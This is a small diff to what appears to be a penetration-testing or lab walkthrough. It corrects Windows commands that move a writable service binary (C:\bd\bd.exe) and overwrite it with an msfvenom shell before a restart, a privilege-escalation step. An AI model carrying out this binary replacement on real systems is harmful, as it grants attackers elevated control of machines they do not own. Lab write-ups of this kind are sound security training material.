@@ -72,13 +72,13 @@ We have read/write access to the barracuda binary.
 Move the binary.
 
 ```
-move C:\bd\bd.exe
+move C:\bd\bd.exe .
 ```
 
 Copy another msfvenom shell to the directory.
 
 ```
-copy /y admin.exe C:\bd\bd.exe
+copy /Y admin.exe C:\bd\bd.exe
 ```
 
 Restart.
